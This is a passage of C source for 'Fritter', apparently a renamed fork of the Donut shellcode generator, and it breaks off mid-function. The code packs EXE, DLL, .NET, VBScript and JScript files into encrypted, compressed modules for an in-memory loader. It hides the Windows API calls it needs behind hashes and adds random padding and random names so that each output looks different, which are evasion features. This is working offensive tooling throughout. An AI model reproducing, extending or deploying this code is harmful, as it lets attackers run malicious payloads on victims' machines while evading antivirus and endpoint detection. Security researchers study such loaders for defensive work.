/**
  BSD 3-Clause License

  Copyright (c) 2019-2020, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "fritter.h"

#include "loader_peb1_exe_x64.h"
#include "loader_peb2_exe_x64.h"
#include "veh_shim_exe_x64.h"
  
#define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
#define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
#define PUT_WORD(p, v)     { t=v; memcpy((char*)p, (char*)&t, 4); p = (uint8_t*)p + 4; }
#define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
 
// required for each API used by the loader
#define DLL_NAMES "ole32;oleaut32;wininet;mscoree;shell32"
 
// These must be in the same order as the FRITTER_INSTANCE structure defined in fritter.h
static API_IMPORT api_imports[] = { 
  {KERNEL32_DLL, "LoadLibraryA"},
  {KERNEL32_DLL, "GetProcAddress"},
  {KERNEL32_DLL, "GetModuleHandleA"},
  {KERNEL32_DLL, "VirtualAlloc"},
  {KERNEL32_DLL, "VirtualFree"},
  {KERNEL32_DLL, "VirtualQuery"},
  {KERNEL32_DLL, "VirtualProtect"},
  {KERNEL32_DLL, "Sleep"},
  {KERNEL32_DLL, "MultiByteToWideChar"},
  {KERNEL32_DLL, "GetUserDefaultLCID"},
  {KERNEL32_DLL, "WaitForSingleObject"},
  {KERNEL32_DLL, "CreateThread"},
  {KERNEL32_DLL, "CreateFileA"},
  {KERNEL32_DLL, "GetFileSizeEx"},
  {KERNEL32_DLL, "GetThreadContext"},
  {KERNEL32_DLL, "GetCurrentThread"},
  {KERNEL32_DLL, "GetCurrentProcess"},
  {KERNEL32_DLL, "GetCommandLineA"},
  {KERNEL32_DLL, "GetCommandLineW"},
  {KERNEL32_DLL, "HeapAlloc"},
  {KERNEL32_DLL, "HeapReAlloc"},
  {KERNEL32_DLL, "GetProcessHeap"},
  {KERNEL32_DLL, "HeapFree"},
  {KERNEL32_DLL, "GetLastError"},
  {KERNEL32_DLL, "CloseHandle"},
        
  {SHELL32_DLL,  "CommandLineToArgvW"},
  
  {OLEAUT32_DLL, "SafeArrayCreate"},
  {OLEAUT32_DLL, "SafeArrayCreateVector"},
  {OLEAUT32_DLL, "SafeArrayPutElement"},
  {OLEAUT32_DLL, "SafeArrayDestroy"},
  {OLEAUT32_DLL, "SafeArrayGetLBound"},
  {OLEAUT32_DLL, "SafeArrayGetUBound"},
  {OLEAUT32_DLL, "SysAllocString"},
  {OLEAUT32_DLL, "SysFreeString"},
  {OLEAUT32_DLL, "LoadTypeLib"},
  
  {WININET_DLL,  "InternetCrackUrlA"},
  {WININET_DLL,  "InternetOpenA"},
  {WININET_DLL,  "InternetConnectA"},
  {WININET_DLL,  "InternetSetOptionA"},
  {WININET_DLL,  "InternetReadFile"},
  {WININET_DLL,  "InternetQueryDataAvailable"},
  {WININET_DLL,  "InternetCloseHandle"},
  {WININET_DLL,  "HttpOpenRequestA"},
  {WININET_DLL,  "HttpSendRequestA"},
  {WININET_DLL,  "HttpQueryInfoA"},
  
  {MSCOREE_DLL,  "CorBindToRuntime"},
  {MSCOREE_DLL,  "CLRCreateInstance"},
  
  {OLE32_DLL,    "CoInitializeEx"},
  {OLE32_DLL,    "CoCreateInstance"},
  {OLE32_DLL,    "CoUninitialize"},

  {NTDLL_DLL,    "RtlEqualUnicodeString"},
  {NTDLL_DLL,    "RtlEqualString"},
  {NTDLL_DLL,    "RtlUnicodeStringToAnsiString"},
  {NTDLL_DLL,    "RtlInitUnicodeString"},
  {NTDLL_DLL,    "RtlExitUserThread"},
  {NTDLL_DLL,    "RtlExitUserProcess"},
  {NTDLL_DLL,    "RtlCreateUnicodeString"},
  {NTDLL_DLL,    "NtContinue"},
  {NTDLL_DLL,    "NtCreateSection"},
  {NTDLL_DLL,    "NtMapViewOfSection"},
  {NTDLL_DLL,    "NtUnmapViewOfSection"},
  //{KERNEL32_DLL, "AddVectoredExceptionHandler"},
  //{KERNEL32_DLL, "RemoveVectoredExceptionHandler"},
  //{NTDLL_DLL,    "RtlFreeUnicodeString"},
  //{NTDLL_DLL,    "RtlFreeString"},
  
  { NULL, NULL }   // last one always contains two NULL pointers
};

// required to load .NET assemblies
static GUID xCLSID_CorRuntimeHost = {
  0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xIID_ICorRuntimeHost = {
  0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xCLSID_CLRMetaHost = {
  0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
  
static GUID xIID_ICLRMetaHost = {
  0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
  
static GUID xIID_ICLRRuntimeInfo = {
  0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};

static GUID xIID_AppDomain = {
  0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};
  
// required to load VBS and JS files
static GUID xIID_IUnknown = {
  0x00000000, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static GUID xIID_IDispatch = {
  0x00020400, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static GUID xIID_IHost  = { 
  0x91afbd1b, 0x5feb, 0x43f5, {0xb0, 0x28, 0xe2, 0xca, 0x96, 0x06, 0x17, 0xec}};
  
static GUID xIID_IActiveScript = {
  0xbb1a2ae1, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptSite = {
  0xdb01a1e3, 0xa42b, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptSiteWindow = {
  0xd10f6761, 0x83e9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};
  
static GUID xIID_IActiveScriptParse32 = {
  0xbb1a2ae2, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptParse64 = {
  0xc7ef7658, 0xe1ee, 0x480e, {0x97, 0xea, 0xd5, 0x2c, 0xb4, 0xd7, 0x6d, 0x17}};

static GUID xCLSID_VBScript = {
  0xB54F3741, 0x5B07, 0x11cf, {0xA4, 0xB0, 0x00, 0xAA, 0x00, 0x4A, 0x55, 0xE8}};

static GUID xCLSID_JScript  = {
  0xF414C260, 0x6AC0, 0x11CF, {0xB6, 0xD1, 0x00, 0xAA, 0x00, 0xBB, 0xBB, 0x58}};

// where to store information about input file
file_info fi;

// return pointer to DOS header
static PIMAGE_DOS_HEADER DosHdr(void *map) {
    return (PIMAGE_DOS_HEADER)map;
}

// return pointer to NT headers
static PIMAGE_NT_HEADERS NtHdr (void *map) {
    return (PIMAGE_NT_HEADERS) ((uint8_t*)map + DosHdr(map)->e_lfanew);
}

// return pointer to File header
static PIMAGE_FILE_HEADER FileHdr (void *map) {
    return &NtHdr(map)->FileHeader;
}

// determines CPU architecture of binary
static int is32 (void *map) {
    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_I386;
}

// return pointer to Optional header
static void* OptHdr (void *map) {
    return (void*)&NtHdr(map)->OptionalHeader;
}

static PIMAGE_DATA_DIRECTORY Dirs (void *map) {
    if (is32(map)) {
      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr(map))->DataDirectory;
    } else {
      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr(map))->DataDirectory;
    }
}

// valid dos header?
static int valid_dos_hdr (void *map) {
    PIMAGE_DOS_HEADER dos = DosHdr(map);
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    return (dos->e_lfanew != 0);
}

// valid nt headers
static int valid_nt_hdr (void *map) {
    return NtHdr(map)->Signature == IMAGE_NT_SIGNATURE;
}

static ULONG64 rva2ofs (void *base, ULONG64 rva) {
    DWORD                 i;
    ULONG64               ofs;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
      
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    sh  = (PIMAGE_SECTION_HEADER)
      ((PBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    
    for (i=0; i<nt->FileHeader.NumberOfSections; i++) {      
      if ((rva >= sh[i].VirtualAddress) && 
          (rva < (sh[i].VirtualAddress + sh[i].SizeOfRawData))) {
          
        ofs = sh[i].PointerToRawData + (rva - sh[i].VirtualAddress);
        return ofs;
      }
    }
    return -1;
}

#ifdef WINDOWS
#include "mmap-windows.c"
#endif

/**
 * Function: map_file
 * ----------------------------
 *   Open and map the contents of file into memory.
 *   
 *   INPUT  : path = file to map
 *       
 *   OUTPUT : Fritter error code. 
 */
static int map_file(const char *path) {
    struct stat fs;

    DPRINT("Entering.");
    
    if(stat(path, &fs) != 0) {
      DPRINT("Unable to read size of file : %s", path);
      return FRITTER_ERROR_FILE_NOT_FOUND;
    }
    
    if(fs.st_size == 0) {
      DPRINT("File appears to be empty!");
      return FRITTER_ERROR_FILE_EMPTY;
    }
    
    fi.fd = open(path, O_RDONLY);
    
    if(fi.fd < 0) {
      DPRINT("Unable to open %s for reading.", path);
      return FRITTER_ERROR_FILE_ACCESS;
    }
    
    fi.len = fs.st_size;
    
    fi.data = mmap(NULL, fi.len, PROT_READ, MAP_PRIVATE, fi.fd, 0);
    
    // no mapping? close file
    if(fi.data == NULL) {
      DPRINT("Unable to map file : %s", path);
      close(fi.fd);
      return FRITTER_ERROR_NO_MEMORY;
    }
    return FRITTER_ERROR_OK;
}

/**
 * Function: unmap_file
 * ----------------------------
 *   Releases memory allocated for file and closes descriptor.
 *
 *   INPUT  : Nothing
 *
 *   OUTPUT : Fritter error code
 */
static int unmap_file(void) {
    
    if(fi.zdata != NULL) {
      DPRINT("Releasing compressed data.");
      free(fi.zdata);
      fi.zdata = NULL;
    }
    if(fi.data != NULL) {
      DPRINT("Unmapping input file.");
      munmap(fi.data, fi.len);    
      fi.data = NULL;
    }
    if(fi.fd != 0) {
      DPRINT("Closing input file.");
      close(fi.fd);
      fi.fd = 0;
    }
    return FRITTER_ERROR_OK;
}

// only included for executable generator or debug build
#if defined(FRITTER_EXE) || defined(DEBUG)
/**
 * Function: file_diff
 * ----------------------------
 *   Calculates the ratio between two lengths for compression and decompression.
 *
 *   INPUT  : new_len = new length
 *          : old_len = old length
 *
 *   OUTPUT : ratio as a percentage
 */
static uint32_t file_diff(uint32_t new_len, uint32_t old_len) {
    if (new_len <= UINT_MAX / 100) {
      new_len *= 100;
    } else {
      old_len /= 100;
    }
    if (old_len == 0) {
      old_len = 1;
    }
    return (100 - (new_len / old_len));
}
#endif

/**
 * Function: compress_file
 * ----------------------------
 *   Compresses the input file based on engine selected by user
 *
 *   INPUT  : Pointer to Fritter configuration.
 *
 *   OUTPUT : Fritter error code. 
 */
int compress_file(PFRITTER_CONFIG c) {
    int err = FRITTER_ERROR_OK;

    DPRINT("Compressing with aPLib");
    fi.zdata = malloc(aP_max_packed_size(fi.len));
    if(fi.zdata != NULL) {
      uint8_t *workmem = malloc(aP_workmem_size(fi.len));
      if(workmem != NULL) {
        fi.zlen = aP_pack(fi.data, fi.zdata, fi.len, workmem, NULL, NULL);

        if(fi.zlen == APLIB_ERROR) err = FRITTER_ERROR_COMPRESSION;
        free(workmem);
      } else {
        free(fi.zdata);
        fi.zdata = NULL;
        err = FRITTER_ERROR_NO_MEMORY;
      }
    } else err = FRITTER_ERROR_NO_MEMORY;

    if(err == FRITTER_ERROR_OK) {
      c->zlen = fi.zlen;
      DPRINT("Original file size : %"PRId32 " | Compressed : %"PRId32, fi.len, fi.zlen);
      DPRINT("File size reduced by %"PRId32"%%", file_diff(fi.zlen, fi.len));
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: read_file_info
 * ----------------------------
 *   Reads information about the input file.
 *
 *   INPUT  : Pointer to Fritter configuration.
 *
 *   OUTPUT : Fritter error code.
 */
static int read_file_info(PFRITTER_CONFIG c) {
    PIMAGE_NT_HEADERS                nt;    
    PIMAGE_DATA_DIRECTORY            dir;
    PMDSTORAGESIGNATURE              pss;
    PIMAGE_COR20_HEADER              cor;
    DWORD                            dll, rva, cpu;
    ULONG64                          ofs;
    PCHAR                            ext;
    int                              err = FRITTER_ERROR_OK;

    DPRINT("Entering.");
    
    // invalid parameters passed?
    if(c->input[0] == 0) {
      DPRINT("No input file provided.");
      return FRITTER_ERROR_INVALID_PARAMETER;
    }

    DPRINT("Checking extension of %s", c->input);
    ext = strrchr(c->input, '.');
    
    // no extension? exit
    if(ext == NULL) {
      DPRINT("Input file has no extension.");
      return FRITTER_ERROR_FILE_INVALID;
    }
    DPRINT("Extension is \"%s\"", ext);

    // VBScript?
    if (strcasecmp(ext, ".vbs") == 0) {
      DPRINT("File is VBS");
      fi.type = FRITTER_MODULE_VBS;
      fi.arch = FRITTER_ARCH_X64;
    } else 
    // JScript?
    if (strcasecmp(ext,  ".js") == 0) {
      DPRINT("File is JS");
      fi.type = FRITTER_MODULE_JS;
      fi.arch = FRITTER_ARCH_X64;
    } else 
    // EXE?
    if (strcasecmp(ext, ".exe") == 0) {
      DPRINT("File is EXE");
      fi.type = FRITTER_MODULE_EXE;
    } else
    // DLL?
    if (strcasecmp(ext, ".dll") == 0) {
      DPRINT("File is DLL");
      fi.type = FRITTER_MODULE_DLL;
    } else {
      DPRINT("Don't recognize file extension.");
      return FRITTER_ERROR_FILE_INVALID;
    }
    
    DPRINT("Mapping %s into memory", c->input);
    
    err = map_file(c->input);
    if(err != FRITTER_ERROR_OK) return err;
    
    // file is EXE or DLL?
    if(fi.type == FRITTER_MODULE_DLL ||
       fi.type == FRITTER_MODULE_EXE)
    {
      if(!valid_dos_hdr(fi.data)) {
        DPRINT("EXE/DLL has no valid DOS header.");
        err = FRITTER_ERROR_FILE_INVALID;
        goto cleanup;
      }
      
      if(!valid_nt_hdr(fi.data)) {
        DPRINT("EXE/DLL has no valid NT header.");
        err = FRITTER_ERROR_FILE_INVALID;
        goto cleanup;
      }

      dir = Dirs(fi.data);
      
      if(dir == NULL) {
        DPRINT("EXE/DLL has no valid image directories.");
        err = FRITTER_ERROR_FILE_INVALID;
        goto cleanup;
      }
      DPRINT("Checking characteristics");
      
      nt  = NtHdr(fi.data);
      dll = nt->FileHeader.Characteristics & IMAGE_FILE_DLL;
      cpu = is32(fi.data);
      rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
      
      // set the CPU architecture for file
      fi.arch = cpu ? 1 /* x86 - unsupported */ : FRITTER_ARCH_X64;
      
      // if COM directory present
      if(rva != 0) {
        DPRINT("COM Directory found indicates .NET assembly.");
        
        // if it has an export address table, we assume it's a .NET
        // mixed assembly. curently unsupported by the PE loader.
        if(dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {
          DPRINT("File looks like a mixed (native and managed) assembly.");
          err = FRITTER_ERROR_MIXED_ASSEMBLY;
          goto cleanup;
        } else {
          // set type to EXE or DLL assembly
          fi.type = (dll) ? FRITTER_MODULE_NET_DLL : FRITTER_MODULE_NET_EXE;
          
          // try read the runtime version from meta header
          strncpy(fi.ver, "v4.0.30319", FRITTER_VER_LEN - 1);
          
          ofs = rva2ofs(fi.data, rva);
          if (ofs != -1) {
            cor = (PIMAGE_COR20_HEADER)(ofs + fi.data);
            rva = cor->MetaData.VirtualAddress;
            if(rva != 0) {
              ofs = rva2ofs(fi.data, rva);
              if(ofs != -1) {
                pss = (PMDSTORAGESIGNATURE)(ofs + fi.data);
                DPRINT("Runtime version : %s", (char*)pss->pVersion);
                strncpy(fi.ver, (char*)pss->pVersion, FRITTER_VER_LEN - 1);
              }
            }
          }
        }
      }
    }
    // assign length of file and type to configuration
    c->len      = fi.len;
    c->mod_type = fi.type;
cleanup:
    if(err != FRITTER_ERROR_OK) {
      DPRINT("Unmapping input file due to errors.");
      unmap_file();
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: gen_random
 * ----------------------------
 *   Generates pseudo-random bytes.
 *
 *   INPUT  : buf = where to store random bytes.
 *          : len = length of random bytes to generate.
 *
 *   OUTPUT : 1 if ok, else 0
 */
static int gen_random(void *buf, uint64_t len) {
#if defined(WINDOWS)
    HCRYPTPROV prov;
    int        ok;
    
    // 1. acquire crypto context
    if(!CryptAcquireContext(
        &prov, NULL, NULL,
        PROV_RSA_FULL,
        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;

    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
    CryptReleaseContext(prov, 0);
    
    return ok;
#else
    int      fd;
    uint64_t r=0;
    uint8_t  *p=(uint8_t*)buf;
    
    DPRINT("Opening /dev/urandom to acquire %li bytes", len);
    fd = open("/dev/urandom", O_RDONLY);
    
    if(fd > 0) {
      for(r=0; r<len; r++, p++) {
        if(read(fd, p, 1) != 1) break;
      }
      close(fd);
    }
    DPRINT("Acquired %li of %li bytes requested", r, len);
    return r == len;
#endif
}

/**
 * Function: gen_random_string
 * ----------------------------
 *   Generates a pseudo-random string
 *
 *   INPUT  : output = pointer to buffer that receives string
 *          : len = length of string to generate
 *
 *   OUTPUT : 1 if ok, else 0  
 */
static int gen_random_string(void *output, uint64_t len) {
    uint8_t rnd[FRITTER_MAX_NAME];
    int     i;
    char    tbl[]="HMN34P67R9TWCXYF";  // https://stackoverflow.com/a/27459196
    char    *str = (char*)output;
    
    if(len == 0 || len > (FRITTER_MAX_NAME - 1)) return 0;
    
    // generate FRITTER_MAX_NAME random bytes
    if(!gen_random(rnd, FRITTER_MAX_NAME)) return 0;
    
    // generate a string using unambiguous characters
    for(i=0; i<len; i++) {
      str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];
    }
    str[i] = 0;
    return 1;
}

/**
 * Function: build_module
 * ----------------------------
 *   Create a Fritter module from Fritter configuration
 *
 *   INPUT  : A pointer to a fritter configuration
 *
 *   OUTPUT : Fritter error code. 
 */
static int build_module(PFRITTER_CONFIG c) {
    PFRITTER_MODULE mod     = NULL;
    uint32_t      mod_len, data_len;
    void          *data;
    int           err = FRITTER_ERROR_OK;
    
    DPRINT("Entering.");
    
    // Compress the input file with aPLib
    err = compress_file(c);

    if(err != FRITTER_ERROR_OK) {
      DPRINT("compress_file() failed");
      return err;
    }
    DPRINT("Assigning %"PRIi32 " bytes of %p to data", fi.zlen, fi.zdata);
    data     = fi.zdata;
    data_len = fi.zlen;

    // Generate random padding length for module data (0-255 bytes)
    uint8_t mod_pad_len = 0;
    gen_random(&mod_pad_len, 1);
    DPRINT("Module data padding: %d bytes", mod_pad_len);

    // Allocate memory for module information and contents of file
    mod_len = data_len + (uint32_t)mod_pad_len + sizeof(FRITTER_MODULE);
    
    DPRINT("Allocating %" PRIi32 " bytes of memory for FRITTER_MODULE", mod_len);
    mod = calloc(mod_len, 1);

    // Memory not allocated? exit
    if(mod == NULL) {
      DPRINT("calloc() failed");
      return FRITTER_ERROR_NO_MEMORY;
    }
    
    // Set the module info
    mod->type     = fi.type;
    mod->thread   = c->thread;
    mod->compress = FRITTER_COMPRESS_APLIB;
    mod->unicode  = c->unicode;
    mod->zlen     = fi.zlen;
    mod->len      = fi.len;
    
    // DotNet assembly?
    if(mod->type == FRITTER_MODULE_NET_DLL ||
       mod->type == FRITTER_MODULE_NET_EXE)
    {
      // If no domain name specified in configuration
      if(c->domain[0] == 0) {
        // if entropy is enabled
        if(c->entropy != FRITTER_ENTROPY_NONE) { 
          // generate a random name
          if(!gen_random_string(c->domain, FRITTER_DOMAIN_LEN)) {
            DPRINT("gen_random_string() failed");
            err = FRITTER_ERROR_RANDOM;
            goto cleanup;
          }
        }
      }
      DPRINT("Domain  : %s", c->domain[0] == 0 ? "Default" : c->domain);
      if(c->domain[0] != 0) {
        // Set the domain name in module
        strncpy(mod->domain, c->domain, FRITTER_DOMAIN_LEN);
      } else {
        memset(mod->domain, 0, FRITTER_DOMAIN_LEN);
      }
      // Assembly is DLL? Copy the class and method
      if(mod->type == FRITTER_MODULE_NET_DLL) {
        DPRINT("Class   : %s", c->cls);
        strncpy(mod->cls, c->cls, FRITTER_MAX_NAME-1);
        
        DPRINT("Method  : %s", c->method);
        strncpy(mod->method, c->method, FRITTER_MAX_NAME-1);
      }
      // If no runtime specified in configuration, use version from assembly
      if(c->runtime[0] == 0) {
        strncpy(c->runtime, fi.ver, FRITTER_MAX_NAME-1);
      }
      DPRINT("Runtime : %s", c->runtime);
      strncpy(mod->runtime, c->runtime, FRITTER_MAX_NAME-1);
    } else
    // Unmanaged DLL? copy function name to module          
    if(mod->type == FRITTER_MODULE_DLL && c->method[0] != 0) {
      DPRINT("DLL function : %s", c->method);
      strncpy(mod->method, c->method, FRITTER_MAX_NAME-1);
    }
      
    // Parameters specified?
    if(c->args[0] != 0) {
      // If file type is unmanaged EXE
      if(mod->type == FRITTER_MODULE_EXE) {
        // If entropy is disabled
        if(c->entropy == FRITTER_ENTROPY_NONE) {
          // Set to "AAAA"
          memset(mod->args, 'A', 4);
        } else {
          // Generate 4-byte random name
          if(!gen_random_string(mod->args, 4)) {
            DPRINT("gen_random_string() failed");
            err = FRITTER_ERROR_RANDOM;
            goto cleanup;
          }
        }
        // Add space
        mod->args[4] = ' ';
      }
      // 
      // Copy parameters 
      strncat(mod->args, c->args, FRITTER_MAX_NAME-6);
    }    
    DPRINT("Copying data to module");
    
    memcpy(&mod->data, data, data_len);
    // Fill padding after compressed data with random bytes
    if(mod_pad_len > 0) {
      gen_random((uint8_t*)&mod->data + data_len, mod_pad_len);
    }
    // update configuration with pointer to module
    c->mod     = mod;
    c->mod_len = mod_len;
cleanup:
    // if there was an error, free memory for module
    if(err != FRITTER_ERROR_OK) {
      DPRINT("Releasing memory due to errors.");
      free(mod);
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: build_instance
 * ----------------------------
 *   Creates the data necessary for main loader to execute VBS/JS/EXE/DLL files in memory.
 *
 *   INPUT  : Pointer to a Fritter configuration.
 *
 *   OUTPUT : Fritter error code. 
 */
static int build_instance(PFRITTER_CONFIG c) {
    FRITTER_CRYPT     inst_key, mod_key;
    PFRITTER_INSTANCE inst = NULL;
    int             cnt, inst_len;
    uint64_t        dll_hash;
    int             err = FRITTER_ERROR_OK;
    
    DPRINT("Entering.");
    
    // Allocate memory for the size of instance based on the type
    DPRINT("Allocating memory for instance");
    inst_len = sizeof(FRITTER_INSTANCE);
    
    // if the module is embedded, add the size of module
    // that will be appended to the end of structure
    if(c->inst_type == FRITTER_INSTANCE_EMBED) {
      DPRINT("The size of module is %" PRIi32 " bytes. " 
             "Adding to size of instance.", c->mod_len);
      inst_len += c->mod_len;
    }
    // Add random padding (0-255 bytes) to vary output size
    uint8_t inst_pad_len = 0;
    gen_random(&inst_pad_len, 1);
    inst_len += inst_pad_len;
    DPRINT("Instance padding: %d bytes", inst_pad_len);

    DPRINT("Total length of instance : %"PRIi32, inst_len);

    // allocate zero-initialized memory for instance
    inst = (PFRITTER_INSTANCE)calloc(inst_len, 1);

    // Memory allocation failed? exit
    if(inst == NULL) {
      DPRINT("Memory allocation failed");
      return FRITTER_ERROR_NO_MEMORY;
    }
    
    // set the length of instance and pointer to it in configuration
    c->inst        = inst;
    c->inst_len    = inst->len = inst_len;
    // set the type of instance we're creating
    inst->type     = c->inst_type;
    // indicate if we should call RtlExitUserProcess to terminate host process
    inst->exit_opt = c->exit_opt;
    // set the Original Entry Point
    inst->oep      = c->oep;
    // set the entropy level
    inst->entropy  = c->entropy;
    // set the headers level
    inst->headers  = c->headers;
    // set the module length
    inst->mod_len  = c->mod_len;

    // encryption enabled?
    if(c->entropy == FRITTER_ENTROPY_DEFAULT) {
      DPRINT("Generating random key for instance");
      if(!gen_random(&inst_key, sizeof(FRITTER_CRYPT))) {
        DPRINT("gen_random() failed");
        err = FRITTER_ERROR_RANDOM;
        goto cleanup;
      }
      // copy local key to configuration
      memcpy(&inst->key, &inst_key, sizeof(FRITTER_CRYPT));
      
      DPRINT("Generating random key for module");
      if(!gen_random(&mod_key, sizeof(FRITTER_CRYPT))) {
        DPRINT("gen_random() failed");
        err = FRITTER_ERROR_RANDOM;
        goto cleanup;
      }
      // copy local key to configuration
      memcpy(&inst->mod_key, &mod_key, sizeof(FRITTER_CRYPT));
      
      DPRINT("Generating random string to verify decryption");
      if(!gen_random_string(inst->sig, FRITTER_SIG_LEN)) {
        DPRINT("gen_random() failed");
        err = FRITTER_ERROR_RANDOM;
        goto cleanup;
      }
     
      DPRINT("Generating random IV for Maru hash");
      if(!gen_random(&inst->iv, MARU_IV_LEN)) {
        DPRINT("gen_random() failed");
        err = FRITTER_ERROR_RANDOM;
        goto cleanup;
      }
    }

    DPRINT("Generating hashes for API using IV: %" PRIX64, inst->iv);
    
    for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
      // calculate hash for DLL string
      dll_hash = maru(api_imports[cnt].module, inst->iv);
      
      // calculate hash for API string.
      // xor with DLL hash and store in instance
      inst->api.hash[cnt] = maru(api_imports[cnt].name, inst->iv) ^ dll_hash;
      
      DPRINT("Hash for %-15s : %-22s = %016" PRIX64, 
        api_imports[cnt].module, 
        api_imports[cnt].name,
        inst->api.hash[cnt]);
    }
    
    DPRINT("Setting number of API to %" PRIi32, cnt);
    inst->api_cnt = cnt;
    
    DPRINT("Setting DLL names to %s", DLL_NAMES);
    strcpy(inst->dll_names, DLL_NAMES);
        
    // if module is .NET assembly
    if(c->mod_type == FRITTER_MODULE_NET_DLL ||
       c->mod_type == FRITTER_MODULE_NET_EXE)
    {
      DPRINT("Copying GUID structures and DLL strings for loading .NET assemblies");

      memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
      memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));
      memcpy(&inst->xCLSID_CLRMetaHost,    &xCLSID_CLRMetaHost,    sizeof(GUID));
      memcpy(&inst->xIID_ICLRRuntimeInfo,  &xIID_ICLRRuntimeInfo,  sizeof(GUID));
      memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
      memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));
    } else 
    // if module is VBS or JS
    if(c->mod_type == FRITTER_MODULE_VBS ||
       c->mod_type == FRITTER_MODULE_JS)
    {       
      DPRINT("Copying GUID structures and DLL strings for loading VBS/JS");
      
      memcpy(&inst->xIID_IUnknown,                &xIID_IUnknown,                sizeof(GUID));
      memcpy(&inst->xIID_IDispatch,               &xIID_IDispatch,               sizeof(GUID));
      memcpy(&inst->xIID_IHost,                   &xIID_IHost,                   sizeof(GUID));
      memcpy(&inst->xIID_IActiveScript,           &xIID_IActiveScript,           sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptSite,       &xIID_IActiveScriptSite,       sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptSiteWindow, &xIID_IActiveScriptSiteWindow, sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptParse32,    &xIID_IActiveScriptParse32,    sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptParse64,    &xIID_IActiveScriptParse64,    sizeof(GUID));
      
      strcpy(inst->wscript,     "WScript");
      strcpy(inst->wscript_exe, "wscript.exe");
      
      if(c->mod_type == FRITTER_MODULE_VBS) {
        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_VBScript, sizeof(GUID));
      } else {
